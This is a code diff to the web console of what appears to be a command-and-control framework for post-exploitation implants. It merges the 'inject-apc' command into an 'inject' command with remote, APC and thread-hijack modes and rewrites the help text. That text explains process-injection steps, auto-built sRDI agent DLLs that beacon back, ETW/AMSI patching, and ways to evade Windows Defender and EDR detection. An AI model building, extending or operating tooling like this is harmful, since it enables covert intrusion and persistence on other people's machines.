@@ -10474,8 +10474,7 @@ const AC_COMMANDS = [
   ['getpid','getpid — agent PID'],
   ['ppid','ppid — parent process PPID'],
   ['screenshot','screenshot → server'],
-  ['inject','inject <pid> <sc.bin>  — section map + CreateRemoteThread into existing process'],
-  ['inject-apc','inject-apc <sc.bin> [proc]  — APC early-bird: spawn suspended proc, inject, resume'],
+  ['inject','inject <pid> [remote|apc|hijack] [sc.bin]  — auto-build C DLL or use shellcode file, inject into PID'],
   ['dotnet-asm','dotnet-asm <asm.exe> [args...] [/proc:<process>]  — .NET → Donut → fork-run in sacrificial process; no visible CLR'],
   ['dotnet-exec','dotnet-exec <asm.exe> [args]  — .NET inline-execute: native in-process CLR, captures Console.Write (Rubeus, Seatbelt, SharpHound)'],
   ['forkrun','forkrun <sc.bin> [proc]  — PPID spoof + section map + thread hijack in sacrificial proc'],
@@ -10610,7 +10609,7 @@ const AC_COMMANDS = [
 // Commands only available on Windows agents — hidden from autocomplete on Linux agents
 const AC_WIN_ONLY = new Set([
   'screenshot',
-  'inject','inject-apc','thread-hijack','forkrun',
+  'inject','thread-hijack','forkrun',
   'dotnet-asm','dotnet-exec','clrstomp','bof','stage2',
   'hook-check','hw-bp-check','pe-exec','mem-fluctuate','mem-fluctuate start','mem-fluctuate stop',
   'encode-uuid',
@@ -10653,7 +10652,6 @@ const AC_TOOLS_ONLY = new Set(['dotnet-exec', 'dotnet-asm', 'clrstomp']);
 // Commands whose first argument is a file from the C2 uploads store,
 // mapped to the extensions they accept (null = any).
 const AC_FILE_CMDS = new Map([
-  ['inject-apc',    ['.bin']],
   ['inject',        ['.bin']],
   ['forkrun',       ['.bin']],
   ['stage2',        ['.bin']],
@@ -10718,7 +10716,7 @@ function consoleAcUpdate() {
   const val   = input.value;
   if (!val.trim()) { consoleAcClose(); return; }
 
-  // File-argument completion: "inject-apc <partial>" or "inject <pid> <partial>"
+  // File-argument completion: "inject <pid> [method] <partial>" or "stage2/forkrun/thread-hijack <partial>"
   const spaceIdx = val.indexOf(' ');
   if (spaceIdx !== -1) {
     const cmd   = val.slice(0, spaceIdx).toLowerCase();
@@ -11219,7 +11217,7 @@ ${isWin ? `  • For PowerShell: shell powershell -nop -enc &lt;base64-UTF16LE&g
   PID, PPID, name, user${isWin ? ', arch, integrity' : ''}
 
   <span class="console-section">NOTES</span>
-${isWin ? `  • Useful for finding target PIDs for inject/inject-apc/token steal
+${isWin ? `  • Useful for finding target PIDs for inject/thread-hijack/token steal
   • System processes (lsass, svchost) require SYSTEM or SeDebugPrivilege` : `  • Useful for identifying target processes
   • Combine with shell kill &lt;pid&gt; to terminate processes`}`,
 
@@ -11261,47 +11259,27 @@ ${isWin ? `  • Useful for finding target PIDs for inject/inject-apc/token stea
   • &lt;server_filename&gt; is the name of the file already uploaded to the C2 server (Files tab)
   • First upload the file to the server via the Upload button in Files, then use this command`,
 
-  'inject': `<b>inject</b> — classic injection into existing process
+  'inject': `<b>inject</b> — inject agent DLL or shellcode into an existing process
 
   <span class="console-section">USAGE</span>
-  inject &lt;pid&gt; &lt;sc.bin&gt;
+  inject &lt;pid&gt; [remote|apc|hijack] [sc.bin]
 
-  <span class="console-section">EXAMPLES</span>
-  inject 1234 agent.bin
-  inject 4892 beacon.bin
+  <span class="console-section">MODES</span>
+  inject 1234              → auto-build C DLL → sRDI → INJECT_REMOTE (default)
+  inject 1234 apc          → auto-build C DLL → sRDI → INJECT_APC
+  inject 1234 hijack       → auto-build C DLL → sRDI → THREAD_HIJACK
+  inject 1234 agent.bin    → use pre-built shellcode → INJECT_REMOTE
+  inject 1234 apc sc.bin   → use pre-built shellcode → INJECT_APC
 
-  <span class="console-section">TECHNIQUE</span>
-  1. VirtualAllocEx in target process
-  2. WriteProcessMemory (shellcode)
-  3. CreateRemoteThread → execution
-
-  <span class="console-section">NOTES</span>
-  • Noisier than inject-apc or thread-hijack
-  • Requires process access (SeDebugPrivilege or same user)
-  • EDRs monitor VirtualAllocEx+WriteProcessMemory+CreateRemoteThread (classic sequence)
-  • For better stealth: use inject-apc (early-bird) or thread-hijack`,
-
-  'inject-apc': `<b>inject-apc</b> — APC early-bird in new sacrificial process
-
-  <span class="console-section">USAGE</span>
-  inject-apc &lt;sc.bin&gt; [sacrificial_process]
-
-  <span class="console-section">EXAMPLES</span>
-  inject-apc agent.bin
-  inject-apc agent.bin svchost.exe
-  inject-apc beacon.bin RuntimeBroker.exe
-
-  <span class="console-section">TECHNIQUE</span>
-  1. Create [proc] suspended (CREATE_SUSPENDED)
-  2. Map section with shellcode (NtCreateSection/NtMapViewOfSection)
-  3. QueueUserAPC → points to shellcode
-  4. ResumeThread → thread executes APC before entry point
+  <span class="console-section">TECHNIQUE (remote)</span>
+  1. Server builds C agent DLL + sRDI → shellcode sent to agent
+  2. Agent: VirtualAllocEx → WriteProcessMemory → CreateRemoteThread
+  3. Injected agent beacons back as new session
 
   <span class="console-section">NOTES</span>
-  • Default process: svchost.exe
-  • Windows Defender on Server 2022 detects cross-process APC even with exclusions
-  • If Defender is active, use <b>stage2</b> (in-process) instead
-  • Sacrificial process must exist on disk at the standard path`,
+  • Requires HTTPS listener running (auto-build mode)
+  • Injected agent beacons back as child of current agent
+  • For stealth: prefer apc or hijack over remote`,
 
   'stage2': `<b>stage2</b> — execute shellcode in the current agent process (in-process)
 
@@ -11318,8 +11296,8 @@ ${isWin ? `  • Useful for finding target PIDs for inject/inject-apc/token stea
   • Runs inside the current agent process (no new process, no cross-process)
   • Agent already has ETW/AMSI patched → shellcode inherits the clean environment
 
-  <span class="console-section">DIFFERENCES vs inject-apc</span>
-  • inject-apc spawns a new process → detected by Defender behavioral engine
+  <span class="console-section">DIFFERENCES vs inject apc</span>
+  • inject &lt;pid&gt; apc targets existing process threads — no new process spawned
   • stage2 is in-process → bypasses Defender cross-process detection on Server 2022
 
   <span class="console-section">NOTES</span>
